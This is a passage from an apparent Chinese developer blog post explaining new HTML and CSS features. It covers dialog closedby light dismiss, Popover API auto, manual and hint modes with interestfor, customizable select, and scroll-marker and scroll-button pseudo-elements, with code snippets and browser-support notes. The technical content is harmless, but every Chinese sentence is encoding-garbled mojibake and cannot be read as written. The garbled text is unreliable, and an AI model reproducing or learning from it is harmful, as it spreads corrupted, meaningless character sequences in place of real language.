<li>å‘½ä»¤æºåªèƒ½æ˜¯Buttonï¼ŒæŸç§ç¨‹åº¦ä¸Šé™åˆ¶äº†å®ƒçš„ä½¿ç”¨ã€‚</li>
</ol>
<h2 data-id="heading-5">äºŒã€å¯¹è¯æ¡†è½»é‡å…³é—­ï¼ˆDialog Light Dismissï¼‰</h2>
<h3 data-id="heading-6">ä¸€å¥è¯çš„è§£é‡Š</h3>
<blockquote>
<p><code>ç»§ Popover Api å¼•å…¥ Light Dismiss ä¹‹åï¼ŒDialog ä¹Ÿæ”¯æŒäº†å®ƒ</code> <a href="https://code.juejin.cn/pen/7582845467080933403" target="_blank" title="https://code.juejin.cn/pen/7582845467080933403">å®Œæ•´ç¤ºä¾‹</a></p>
</blockquote>
<p>Light Dismiss ç›´æ¥ç¿»è¯‘å°±æ˜¯è½»é‡å…³é—­ï¼Œå‹å¥½å…³é—­ï¼Œå…·ä½“æ˜¯æŒ‡é€šè¿‡ç‚¹å‡» ::backdrop åŒºåŸŸã€æŒ‰ä¸‹ Esc é”®å³å¯è§¦å‘ç›®æ ‡å…ƒç´ è‡ªåŠ¨å…³é—­çš„äº¤äº’è¡Œä¸ºã€‚Light DismissåŒæ ·çš„å…·å¤‡å£°æ˜å¼å¯é˜…è¯»æ€§ï¼Œè¿˜èƒ½é¿å…Javascriptçš„ä½¿ç”¨ã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">dialog</span> <span class="hljs-attr">closedby</span>=<span class="hljs-string">"none"</span>&gt;</span>  ä¸è§¦å‘å…³é—­ <span class="hljs-tag">&lt;/<span class="hljs-name">dialog</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dialog</span> <span class="hljs-attr">closedby</span>=<span class="hljs-string">"closerequest"</span>&gt;</span>æ¥å— escæˆ–å…¶å®ƒjsè§¦å‘ <span class="hljs-tag">&lt;/<span class="hljs-name">dialog</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dialog</span> <span class="hljs-attr">closedby</span>=<span class="hljs-string">"any"</span>&gt;</span>  æ¥å—ä»»ä½•è§¦å‘ <span class="hljs-tag">&lt;/<span class="hljs-name">dialog</span>&gt;</span>
</code></pre>
<p>Light Dismiss é€šå¸¸æ˜¯ç”¨æˆ·åœ¨äº¤äº’è¿‡ç¨‹ä¸­é¢„æœŸçš„é»˜è®¤è¡Œä¸ºï¼Œè¿™ä¸€è®¾è®¡ä¸ä»…ä½“ç°äº† Chrome å¯¹ç”¨æˆ·ä½¿ç”¨ä½“éªŒäººä½“å·¥ç¨‹å­¦çš„å…³æ³¨ï¼Œæ›´å½°æ˜¾äº†å…¶å¯¹å¼€å‘è€…å¼€å‘ä½“éªŒäººä½“å·¥ç¨‹å­¦çš„é‡è§†ã€‚å¼€å‘è€…æ— éœ€è¿›è¡Œé¢å¤–å¼€å‘ï¼Œå³å¯è·å¾—é¢„æœŸçš„åˆç†ç»“æœã€‚å»¶ä¼¸äº†è§£å®ƒçš„ä¸€äº›ç»†èŠ‚ï¼š</p>
<ul>
<li>closerequest ä¸ any çš„ç›¸æ¯”ï¼Œå®ƒä¸æ¥å—<code>ç‚¹å‡»::backdropåŒºåŸŸå…³é—­</code>ï¼›æ­¤å¤–ç§»åŠ¨ç«¯çš„æ‰‹æŒ‡ä¾§æ»‘æˆ–å¯¼èˆªå›é€€ä¹Ÿä¼šè§¦å‘closerequestçš„è¡Œä¸ºã€‚</li>
<li>dialog.requestClose()åœ¨dialogå…ƒç´ ä¸Šè§¦å‘ <code>cancel å’Œ close</code>äº‹ä»¶ï¼Œ è€Œdialog.close() åªè§¦å‘<code>close</code>äº‹ä»¶ã€‚ åœ¨<code>cancel</code>äº‹ä»¶ä¸­æ‰§è¡Œ<code>ev.preventDefault()</code>å¯é˜»æ­¢å…³é—­ã€‚</li>
<li>dialogå…ƒç´ æ²¡æœ‰openäº‹ä»¶ï¼Œä½†å®ƒæœ‰ <code>toggle, beforetoggleäº‹ä»¶</code>, ç”¨æ¥ç›‘å¬æ‰“å¼€å…³é—­ã€‚ äº‹ä»¶å¯¹è±¡çš„<code>oldState,newState</code>ç”¨æ¥åˆ¤æ–­åˆ‡æ¢çš„æ–¹å‘ã€‚ æ­¤å¤–ï¼Œåªæœ‰<code>dialog å’Œ å¼¹å‡ºå±‚</code>æ”¯æŒè¿™2ä¸ªäº‹ä»¶åã€‚</li>
</ul>
<h3 data-id="heading-7">å…¼å®¹æ€§</h3>
<p>æ”¯æŒchrome134+Â  ff141+ï¼Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftak-dcxi%2Fdialog-closedby-polyfill" target="_blank" title="https://github.com/tak-dcxi/dialog-closedby-polyfill" ref="nofollow noopener noreferrer">polyfill æ–¹æ¡ˆ</a>ã€‚</p>
<h3 data-id="heading-8">å»¶ä¼¸ç†è§£ Popover API çš„Light Dismiss</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">popovertarget</span>=<span class="hljs-string">"mypopover"</span> <span class="hljs-attr">popovertargetaction</span>=<span class="hljs-string">"toggle"</span>&gt;</span>åˆ‡æ¢æ˜¾ç¤º<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"mypopover"</span> <span class="hljs-attr">popover</span>&gt;</span>è¿™æ˜¯ä¸€ä¸ª auto å¼¹å‡ºå±‚<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p><strong>å‘½ä»¤æº</strong>ï¼šâ­ä»… Button å…ƒç´ å’ŒInput(type=button)æ‰å…è®¸å½“å‘½ä»¤æºï¼Œå®ƒæ·»åŠ ä»¥ä¸‹å±æ€§ï¼š</p>
<ul>
<li>ã€attrã€‘popovertarget: å…¶å€¼ä¸ºpopoverå…ƒç´ id</li>
<li>ã€attrã€‘popovertargetaction: ç‚¹å‡»çš„å‘½ä»¤åŠ¨ä½œï¼Œå…¶å€¼ä¸ºï¼š 'hide' | 'show' | 'toggle'</li>
</ul>
<blockquote>
<p>è§¦å‘popoverè¿˜å¯ä»¥ç”¨ä¼ ç»Ÿçš„Javascript, æˆ–è€…Buttonçš„commands æ¨¡å¼ï¼Œæ¯”å¦‚ï¼š el.showPopover()</p>
</blockquote>
<p><strong>popoverå±‚</strong>ï¼š ä»»æ„æ·»åŠ äº† [popover] å±æ€§çš„å…ƒç´ </p>
<ul>
<li>ã€attrã€‘popover: è®¾ç½®å…ƒç´ ä¸ºä¸€ä¸ªå¼¹å‡ºå±‚ï¼Œå®ƒæœ€æ—©æ”¯æŒä»¥ä¸‹2ä¸ªå€¼ï¼š
<ul>
<li>auto: è‡ªåŠ¨æ¨¡å¼ï¼Œä¹Ÿæ˜¯é»˜è®¤å€¼ã€‚ autoå³ç¬¦åˆLight Dismissé»˜è®¤å…³é—­è¡Œä¸ºã€‚åŒä¸€ä¸ªé¡µé¢ä¸Šï¼Œautoç±»åˆ«çš„å…ƒç´ åªèƒ½æ˜¾ç¤ºä¸€ä¸ªã€‚</li>
<li>manual:Â æ‰‹åŠ¨æ¨¡å¼ã€‚å¿…é¡»æ˜¾ç¤ºçš„å£°æ˜popovertargetactionï¼Œæˆ–è°ƒç”¨Javascriptå‡½æ•°æ‰è§¦å‘ï¼Œæ¯”å¦‚ï¼šel.showPopover()ã€‚åŒä¸€ä¸ªé¡µé¢ä¸Šï¼Œmanualç±»åˆ«å…ƒç´ å¯æ˜¾ç¤ºå¤šä¸ªã€‚</li>
</ul>
</li>
</ul>
<p>å‚è€ƒ<a href="https://code.juejin.cn/pen/7583980914653593635" target="_blank" title="https://code.juejin.cn/pen/7583980914653593635">å®Œæ•´ç¤ºä¾‹</a>ï¼Œå¯¹æ¯” Dialog ä¸ Popover API :</p>
<ul>
<li>éƒ½æ”¯æŒInvoker Commands å’Œ Light Dismiss</li>
<li>éƒ½æ”¯æŒJavascriptæ§åˆ¶å’Œå£°æ˜å¼è¡¨è¾¾ï¼š dialogå…ƒç´ çš„<code>closedby</code> å’Œ popoverå…ƒç´ çš„<code>popover</code>å±æ€§</li>
<li>éƒ½ä¼šäº§ç”Ÿä¸€ä¸ª<code>Top Layer</code>, æ— é¡»z-indexå°±èƒ½ç½®é¡¶å…ƒç´ ï¼Œä¸”ä¸å—çˆ¶å…ƒç´ çš„positionå½±å“ã€‚</li>
<li>å‘½ä»¤æºå’Œå‘½ä»¤ç›®æ ‡ä¹‹é—´ä¼šéšå¼çš„äº§ç”Ÿaria-detailså…³è”aria-expandedï¼Œç”¨äºè§¦å‘ç„¦ç‚¹å¯¼èˆªç­‰ã€‚</li>
</ul>
<p>Popover APIçš„è¿™äº›ç‰¹æ€§å…¼å®¹æ€§ä¸ºï¼šchrome114+, ff125+</p>
<h2 data-id="heading-9">ä¸‰ã€å¢å¼ºPopover (popover="hint") ä¸ å…´è¶£è°ƒç”¨(Interest Invoker)</h2>
<h3 data-id="heading-10">ä¸€å¥è¯çš„è§£é‡Š</h3>
<blockquote>
<p><code>hintæš—ç¤ºï¼šä¸€ç§æ›´è½»é‡çš„è§¦å‘è¡Œä¸ºçš„popoverç±»åˆ«</code> <a href="https://code.juejin.cn/pen/7584011726266318874" target="_blank" title="https://code.juejin.cn/pen/7584011726266318874">å®Œæ•´ç¤ºä¾‹</a></p>
</blockquote>
<p>åœ¨ä¸Šå°èŠ‚ä¸­ï¼Œå·²ç»è®²äº†popoveråŸæœ‰çš„2ä¸ªç±»åˆ«ï¼Œä»Šå¹´å®ƒåˆæ–°å¢äº†ä¸€ä¸ªç±»åˆ«ï¼šhint æš—ç¤ºã€‚è¿™ç§<code>hintå¼¹å‡ºå±‚</code>ï¼Œä¸ä»…å¯ä»¥ç”¨åŸæ¥çš„æ–¹æ³•è§¦å‘å®ƒï¼Œè¿˜å¢åŠ äº†ä¸€ç§å…´è¶£è°ƒç”¨è§¦å‘ã€‚ å…´è¶£è°ƒç”¨<code>Interest Invoker</code>æ˜¯æŒ‡ï¼šé€šè¿‡éç‚¹å‡»äº‹ä»¶ï¼Œæ¯”å¦‚hover,mouseover,mouseout, focus,blur å®ƒçš„å˜åŒ–ã€‚æ‚¬æµ®å°±æ˜¾ç¤ºï¼Œç¦»å¼€å°±éšè—ï¼Œååˆ†ç¬¦åˆ<code>tooltipç»„ä»¶</code>åœºæ™¯ã€‚</p>
<pre><code class="hljs language-html" lang="html">  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">interestfor</span>=<span class="hljs-string">"mypopover1"</span>&gt;</span>æ‚¬æµ®è§¦å‘ hint1 å¼¹å‡ºå±‚<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"mypopover1"</span> <span class="hljs-attr">popover</span>=<span class="hljs-string">'hint'</span>&gt;</span>è¿™æ˜¯ä¸€ä¸ª hint1 å¼¹å‡ºå±‚<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p><strong>å‘½ä»¤æº</strong>ï¼šå®ƒæ–°å¢ä»¥ä¸‹ç›¸å…³å†…å®¹ï¼š</p>
<ul>
<li>ã€attrã€‘interestfor: å±æ€§å€¼ä¸º hintç±»åˆ«çš„popoverå…ƒç´ id</li>
<li>ã€css-ruleã€‘interest-delay: è®¾ç½®æ‚¬æµ®è§¦å‘å’Œç¦»å¼€éšè—çš„æ—¶é—´ã€‚ å®ƒæ˜¯å¤åˆå±æ€§ï¼š interest-delay-start, interest-delay-endã€‚é»˜è®¤è§¦å‘çš„æ—¶é—´æ˜¯ 0.5sã€‚</li>
<li>ã€css-selectorã€‘ :interest-source å’Œ :interest-target æ˜¯æŒ‡ï¼Œå¦‚æœå½“å‰å…´è¶£æ­£åœ¨å‘ç”Ÿï¼Œé‚£ä¹ˆè§¦å‘æºå’Œhint å¼¹å‡ºå±‚å°±åˆ†åˆ«ä¸ºå…·æœ‰ä¸Šé¢çš„ä¼ªç±»ã€‚ç±»ä¼¼äº dialogæ‰“å¼€æ—¶ï¼Œdialog:opençš„ä¼ªç±»ä¸€æ ·ã€‚è¯¦è§ä¸Šé¢ç¤ºä¾‹ã€‚</li>
</ul>
<p><strong>hint å¼¹å‡ºå±‚</strong>ï¼šæ–°å¢ä»¥ä¸‹äº‹ä»¶ï¼š</p>
<ul>
<li>ã€eventã€‘interest: è§¦å‘æ˜¾ç¤ºçš„<code>InterestEventäº‹ä»¶</code>, äº‹ä»¶çš„sourceæŒ‡å‘è§¦å‘æºå…ƒç´ ã€‚</li>
<li>ã€eventã€‘loseinterest: ç¦»å¼€å¤±å»çš„<code>InterestEventäº‹ä»¶</code>ï¼Œäº‹ä»¶çš„sourceæŒ‡å‘è§¦å‘æºå…ƒç´ ã€‚</li>
</ul>
<p>å…´è¶£è°ƒç”¨ä¸å‰é¢2èŠ‚çš„å†…å®¹æœ‰ä¸€äº›é‡è¦çš„å·®å¼‚ï¼š</p>
<ol>
<li>å¼ºè°ƒå¿…é¡»éç‚¹å‡»äº‹ä»¶ï¼Œåœºæ™¯å¯¹åº”â€œæ‚¬è€Œæœªå†³â€çš„çŠ¶æ€ï¼Œå¯ä»¥é…åˆpopover="hint"ä½¿ç”¨ã€‚</li>
<li>è§¦å‘æºæ›´å¹¿æ³›ï¼Œä¸ä»…æ˜¯Buttonå…ƒç´ ï¼Œè¿˜å…è®¸ <code>&lt;a&gt;, &lt;button&gt;,&lt;area&gt;,SVG &lt;a&gt; </code>ã€‚</li>
<li>hintç±»åˆ«ä¸å½±å“autoç±»åˆ«çš„å¼¹çª—ï¼Œä¸ä¼šä¸»åŠ¨è§¦å‘autoå¼¹çª—å…³é—­ã€‚</li>
</ol>
<p>é•¿æœŸä»¥æ¥Webæ ‡å‡†å¯¹<code>hover</code>è¡Œä¸ºæ˜¯æ·¡è§†çš„ï¼Œåªæœ‰titleå±æ€§å’Œ :hoverçš„ä¼ªç±»ï¼Œä¸€ç›´ç¼ºå°‘å…³é”®çš„<code>hoveräº‹ä»¶</code>ã€‚æ­¤æ¬¡æä¾› <code>interestäº‹ä»¶</code>,å€Ÿæ­¤å¯ä»¥å˜ç›¸çš„è§†ä¸ºä¸€ç§<code>hoveräº‹ä»¶</code></p>
<h3 data-id="heading-11">å…¼å®¹æ€§</h3>
<p>æ”¯æŒchrome 142+, ä¸æ”¯æŒï¼šff,safari, <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmfreed7%2Finterestfor" target="_blank" title="https://github.com/mfreed7/interestfor" ref="nofollow noopener noreferrer">polyfill æ–¹æ¡ˆ</a>ã€‚</p>
<h2 data-id="heading-12">å››ã€å¯è‡ªå®šä¹‰çš„select (Customizable select)</h2>
<h3 data-id="heading-13">ä¸€å¥è¯çš„è§£é‡Š</h3>
<blockquote>
<p><code>å¢å¼ºçš„select å’Œ option å…ƒç´ ï¼Œä¸°å¯Œçš„ä¼ªç±»ã€ä¼ªå…ƒç´ ï¼Œå®šåˆ¶æ›´å®¹æ˜“</code> <a href="https://code.juejin.cn/pen/7584018175914999818" target="_blank" title="https://code.juejin.cn/pen/7584018175914999818">å®Œæ•´ç¤ºä¾‹</a></p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f6d7b5ba44a48b68e3975012d7c51e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767669146&amp;x-signature=Bar6EY5%2Fl9YENUHr2vR3so7XFk0%3D" alt="ScreenShot_20251230103200.PNG" loading="lazy"/></p>
<p>å¯å®šåˆ¶çš„selectå¢åŠ äº†å¾ˆå¤šdomè§„èŒƒå’Œä¼ªç±»ï¼Œä¼ªå…ƒç´ ï¼Œå†…å®¹å¤ªå¤šä¸å®œå±•å¼€ç»†è¿°ï¼Œæ„Ÿå…´è¶£çœ‹ä¸Šé¢çš„å®Œæ•´MDNç¤ºä¾‹ï¼Œæˆ‘å·²ç»å¢åŠ è¯¦ç»†çš„æ³¨é‡Šã€‚æ­¤å¤„ä»…åˆ—å‡ºä¸€äº›é‡è¦çš„æ¦‚å¿µå’Œäº‹é¡¹ï¼Œä»¥ä¾¿èƒ½å¿«é€Ÿç†è§£ï¼š</p>
<ol>
<li>base-select è®¾ç½®ï¼š</li>
</ol>
<p>select å’Œ ::picker(select)ä¼ªå…ƒç´ éƒ½å¿…é¡»æ·»åŠ è§„åˆ™ï¼š <code>appearance: base-select</code> ,ä»¥åŒºåˆ«äºä¼ ç»Ÿselectæ ·å¼ã€‚</p>
<ol start="2">
<li>å¼¹å‡ºå±‚::picker(select)ç‰¹æ€§ï¼š</li>
</ol>
<p>å®ƒæ¸²æŸ“åœ¨é¡µé¢é¡¶å±‚<code>Top Layer</code>ï¼Œè¿™æ„å‘³ç€å®ƒä¼šæ˜¾ç¤ºåœ¨æ‰€æœ‰å…¶ä»–å†…å®¹ä¹‹ä¸Šï¼Œä¸ä¼šè¢«çˆ¶å®¹å™¨è£å‰ªã€‚æµè§ˆå™¨è¿˜ä¼šæ ¹æ®è§†å£ä¸­çš„å¯ç”¨ç©ºé—´è‡ªåŠ¨è°ƒæ•´ä¸‹æ‹‰åˆ—è¡¨çš„ä½ç½®å’Œç¿»è½¬ã€‚</p>
<ol start="3">
<li>å¢å¼ºçš„option:</li>
</ol>
<p>ä¼ ç»Ÿçš„optionå…ƒç´ ä»…æ”¯æŒ label,valueå±æ€§å’Œselectedï¼Œdisabledçš„å¸ƒå°”å±æ€§ã€‚<code>optionä¸­åµŒå¥—æœ‰å…¶å®ƒå…ƒç´ ï¼Œéƒ½æ˜¯ä¼šå¿½ç•¥çš„</code>ã€‚</p>
<p>å¢å¼ºåçš„optionå…ƒç´ <code>æ”¯æŒåµŒå¥—span,imgç­‰ç­‰æ™®é€šå…ƒç´ </code>ï¼Œä½†è¦é¿å…åµŒå¥— a, input ç­‰äº¤äº’å…ƒç´ å°±è¡Œäº†ã€‚Â </p>
<ol start="4">
<li>æ–°å¢ selectedcontent å…ƒç´ ï¼š</li>
</ol>
<p>è¯¥å…ƒç´ å¿…é¡»éµå¾ª <code>select &gt; button &gt; selectedcontent</code> çš„åµŒå¥—ç»“æ„ï¼Œè¯¦è§ç¤ºä¾‹ã€‚</p>
<p>selectçš„é€‰æ‹©å€¼ï¼ˆå³changeäº‹ä»¶ï¼‰ä¹‹åï¼Œé€‰ä¸­çš„optionçš„èŠ‚ç‚¹ä¼šè¢«cloneNodeåˆ›å»ºå‰¯æœ¬ï¼Œæ’å…¥åˆ°<code>selectedcontent</code>ä¸­ï¼Œæ‰€ä»¥ä»–ä»¬ç»“æ„ä¸€æ ·ï¼Œä½†ä¸æ˜¯åŒä¸€ä¸ªå…ƒç´ å®ä¾‹ã€‚</p>
<p>åŒæ—¶buttonæ˜¯æƒ°æ€§çš„ï¼Œä¸å“åº”focusç­‰ï¼Œè¡Œä¸ºæ›´åƒæ˜¯ <code>div</code>ã€‚</p>
<p>option å’Œ selectedcontent çš„å­é¡¹ï¼Œéƒ½å¯ä»¥ç”¨æ™®é€šçš„ css é€‰æ‹©å™¨å»åˆ†åˆ«æ§åˆ¶æ ·å¼ã€‚</p>
<ol start="5">
<li>select å€Ÿç”¨ Popover API</li>
</ol>
<p>å®ƒ<code>éšå¼å€Ÿç”¨äº†éå¸¸å¤šçš„Popover ç‰¹æ€§</code>ï¼Œæ¯”å¦‚ :popover-openä¼ªç±»ï¼Œæ— éœ€<code>anchor-name</code>çš„éšå¼çš„é”šç‚¹å¼•ç”¨ï¼Œä¸”å¯ä»¥å®šä¹‰å¼¹å‡ºå±‚ä¸é”šç‚¹çš„ä½ç½®å…³ç³»ï¼Œæº¢å‡ºç¿»è½¬ç­‰ç­‰ã€‚</p>
<ol start="6">
<li>selectçš„multiple å’Œ optgroup æœªå¢å¼º</li>
</ol>
<p>è¿™æ„å‘³ç€å¤šé€‰å’Œåˆ†ç»„åŠŸèƒ½ï¼Œéœ€è¦é‡æ–°å®ç°ï¼Œå¯¹äºç»„ä»¶åº“çš„ä½œè€…æ¥è¯´ï¼Œè¿™æ— ç–‘å¾—å›é€€åˆ°ä¼ ç»Ÿæ–¹æ¡ˆï¼Œå¹¸å¥½æœ‰Popover APIã€‚</p>
<h3 data-id="heading-14">å…¼å®¹æ€§ï¼š</h3>
<p>æ”¯æŒ chrome 135+ , ff,safariå‡ ä¸æ”¯æŒğŸ˜­ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjosepharhar%2Fcustomizable-select-polyfill%25C2%25A0" target="_blank" title="https://github.com/josepharhar/customizable-select-polyfill%C2%A0" ref="nofollow noopener noreferrer">polyfill æ–¹æ¡ˆ</a></p>
<p>è¿™ä¸ªæ–¹æ¡ˆå¹¶éçœŸæ­£æ„ä¹‰çš„polyfill, å®ƒä½¿ç”¨è‡ªå®šä¹‰çš„ webComponentæŠ€æœ¯å®ç°äº†å¹³æ›¿ã€‚</p>
<h2 data-id="heading-15">äº”ã€æ»šåŠ¨æ§åˆ¶ä¼ªå…ƒç´ (::scroll-marker/button())</h2>
<h3 data-id="heading-16">ä¸€å¥è¯çš„è§£é‡Š</h3>
<blockquote>
<p>ä¸ºæ»šåŠ¨å®¹å™¨çš„æ·»åŠ ä¼ªå…ƒç´ ï¼Œç”¨äºæ§åˆ¶å®¹å™¨æ»šåŠ¨ <a href="https://code.juejin.cn/pen/7584018234107265062" target="_blank" title="https://code.juejin.cn/pen/7584018234107265062">å®Œæ•´ç¤ºä¾‹</a></p>
</blockquote>
<p>HTMLæ—©æ—©æ·»åŠ äº†dialog, detail ç­‰å…ƒç´ ï¼Œä½†ä¸€ç›´æ²¡æœ‰å¢åŠ ä¸€ä¸ªè½®æ’­å›¾å…ƒç´ ï¼Œä»Šå¹´åªæŠ æŠ æœæœæ·»åŠ äº†ä¸‰ä¸ªä¼ªå…ƒç´ ï¼Œæˆ–è®¸æ˜¯å› ä¸ºæ·»åŠ ä¸€ä¸ªæ–°å…ƒç´ éœ€è¦è€ƒè™‘çš„äº‹æƒ…å¤ªå¤šã€‚</p>
<ol>
<li>::scroll-button() Â <code>æ»šåŠ¨å®¹å™¨æŒ‰é’®çš„ä¼ªå…ƒç´ </code>ï¼Œç‚¹å‡»å®ƒä¼šè§¦å‘å®¹å™¨æ»šåŠ¨ã€‚å®ƒéå¸¸ç±»ä¼¼äº ::before, ::afterä½œç”¨, éƒ½éœ€è¦contentæ‰æ˜¾ç¤º,ä¸”å‘ˆç°åœ¨å®¹å™¨çš„å†…éƒ¨ã€‚</li>
</ol>
<p>æ¯ä¸ªå®¹å™¨æœ€å¤šæœ‰4ä¸ªæ»šåŠ¨æ–¹å‘ï¼Œæ‹¬å·çš„ä½œç”¨æ˜¯<code>æŒ‡å®šæ»šåŠ¨æ–¹å‘</code>ï¼Œå¯å–å€¼ï¼š*ï¼Œ left,right,up,down, block-end,block-start, inline-end,inline-startç­‰ã€‚</p>
<p>æŒ‰é’®ä¼ªå…ƒç´ å…·æœ‰çŠ¶æ€ï¼Œæ¯”å¦‚å®¹å™¨æ»šåŠ¨åˆ°ä¸¤ç«¯ä¹‹åï¼Œæ»šåŠ¨æŒ‰é’®ä¼šè‡ªåŠ¨ç¦ç”¨ã€‚ å®ƒå…·æœ‰ä»¥ä¸‹çŠ¶æ€ï¼š enabled, disabled,hover,active,focus</p>
<ol start="2">
<li>::scroll-marker æ˜¯æ»šåŠ¨å®¹å™¨ä¸­ï¼ŒæŒ‡ç¤º<code>æ»šåŠ¨é¡¹çš„ä¼ªå…ƒç´ </code>ï¼Œå®ƒåŒæ ·ä¹Ÿéœ€è¦contentæ‰æ˜¾ç¤ºã€‚</li>
</ol>
<p>å®ƒå…·æœ‰ <code>:target-current ä¼ªç±»</code>ï¼Œ è¡¨ç¤ºæ»šåŠ¨åˆ°å½“å‰æ»šåŠ¨é¡¹ã€‚å½“ç„¶ï¼Œ :hover, :activeç­‰ä¼ªç±»ä¹Ÿèƒ½ä½¿ç”¨</p>
<ol start="3">
<li>::scroll-marker-group æ˜¯å‘ˆç°åœ¨æ»šåŠ¨å®¹å™¨å†…éƒ¨çš„ä¼ªå…ƒç´ ï¼Œæ”¶é›†å®¹çº³æ‰€æœ‰çš„::scroll-markerå…ƒç´ ã€‚</li>
</ol>
<p>marker-groupå…ƒç´ è‡ªèº«æ²¡æœ‰é«˜åº¦ï¼Œä½†å¯ä»¥è®¾ç½®è¾¹æ¡†ï¼Œå¸ƒå±€ï¼Œé—´è·ç­‰å†…å®¹ã€‚</p>
<h3 data-id="heading-17">å…¼å®¹æ€§ï¼š</h3>
<p>æ”¯æŒchrome 135+ , ff,safariå‡ ä¸æ”¯æŒğŸ˜­ã€‚ç”±äºå®ƒæ˜¯css ç‰¹æ€§ï¼Œæ— æ³•Polyfill, å»ºè®®ä½¿ç”¨ä¼ ç»Ÿçš„divå»å®ç°å³å¯ï¼</p>
<h2 data-id="heading-18">å…­ã€è®¾ç½®æ»šåŠ¨æ ‡è®°ç»„å®¹å™¨(scroll-target-group)</h2>
<h3 data-id="heading-19">ä¸€å¥è¯çš„è§£é‡Š</h3>
<blockquote>
<p>è®¾ç½®å…ƒç´ ä¸ºæ»šåŠ¨å®¹å™¨ <a href="https://code.juejin.cn/pen/7584728540432564224" target="_blank" title="https://code.juejin.cn/pen/7584728540432564224">å®Œæ•´ç¤ºä¾‹</a></p>
</blockquote>
<p>CSSå±æ€§ scroll-target-group ç”¨æ¥æŒ‡å®šä¸€ä¸ªå…ƒç´ ä¸ºæ»šåŠ¨æ ‡è®°ç»„å®¹å™¨ï¼Œ å®ƒåªæœ‰2ä¸ªå€¼ï¼šÂ </p>
<ul>
<li>none: å…ƒç´ éæ»šåŠ¨æ ‡è®°ç»„å®¹å™¨</li>
<li>auto: å…ƒç´ ä¸ºæ»šåŠ¨æ ‡è®°ç»„å®¹å™¨</li>
</ul>
<p>æ»šåŠ¨æ ‡è®°ç»„å®¹å™¨ä¸­é€šå¸¸åŒ…å«é”šç‚¹é“¾æ¥åˆ—è¡¨ç­‰ï¼Œé…åˆä¼ªç±» :target-current æ¥çªå‡ºæ˜¾ç¤ºæŸä¸ªé”šç‚¹ï¼Œæ•ˆæœéå¸¸ç±»ä¼¼ä¼ ç»Ÿçš„Anchorç»„ä»¶ï¼Œå½“å®¹å™¨æ»šåŠ¨æ—¶ï¼Œå¯ä»¥é«˜äº®æŒ‡å®šçš„ç›®å½•é¡¹ï¼Œä¸è¿‡è¿™äº›éƒ½æ˜¯æµè§ˆå™¨è‡ªåŠ¨å®Œæˆçš„ï¼Œä¸éœ€è¦ä¸€è¡Œjavascriptã€‚</p>
<p>å®ƒä¸::scroll-marker-group æœ‰æŸäº›ç›¸ä¼¼ç‚¹ï¼š</p>
<ul>
<li>::scroll-marker-groupï¼šæ˜¯åœ¨æŸä¸ªå…ƒç´ å†…éƒ¨ï¼Œåˆ›å»ºä¸€ä¸ªä¼ªå…ƒç´ å®¹å™¨ï¼Œç”¨æ¥å®¹çº³::sroll-markerï¼Œ éƒ½æ˜¯ä¼ªå…ƒç´ ã€‚</li>
<li>scroll-target-group: æ˜¯æŠŠä¸€ä¸ªçœŸå®å…ƒç´ å˜ä¸ºæ»šåŠ¨å®¹å™¨ï¼Œå†…éƒ¨æ”¾çœŸå®çš„link ç±»å…ƒç´ ï¼Œæ‰€ä»¥æ§åˆ¶ä¸Šä¼šæ›´çµæ´»ã€‚</li>
</ul>
<p>ä»å®˜æ–¹çš„æ€åº¦çœ‹ï¼Œè¿™2ä¸ªæ¦‚å¿µæå…¶ç›¸è¿‘ï¼Œéƒ½æ˜¯å®šä¹‰äº†ä¸€ä¸ªæ»šåŠ¨å®¹å™¨ï¼Œä¸”å†…éƒ¨çš„é”šç‚¹è¡Œä¸ºä¸€è‡´ï¼Œå‡æ”¯æŒä¼ªç±» :target-current ä»£è¡¨é«˜äº®çŠ¶æ€ï¼Œé¿å…Javascriptå»æ»šåŠ¨å’Œè®¾ç½®é«˜äº®ç­‰ã€‚</p>
<h3 data-id="heading-20">å…¼å®¹æ€§ï¼š</h3>
<p>æ”¯æŒ chrome 140+ ,ä½†ff,safariå‡ ä¸æ”¯æŒğŸ˜­ï¼Œä¸”css ç‰¹æ€§æ— æ³•Polyfillã€‚</p>
<h2 data-id="heading-21">ä¸ƒã€é”šå®šå®¹å™¨æŸ¥è¯¢ï¼ˆAnchored Container Queriesï¼‰</h2>
<h3 data-id="heading-22">ä¸€å¥è¯çš„è§£é‡Š</h3>
<blockquote>
<p>é”šç‚¹å®šä½æ—¶ï¼Œç¿»è½¬çŠ¶æ€å¯ä»¥æŸ¥è¯¢<a href="https://code.juejin.cn/pen/7584738593622392870" target="_blank" title="https://code.juejin.cn/pen/7584738593622392870">å®Œæ•´ç¤ºä¾‹</a></p>
</blockquote>
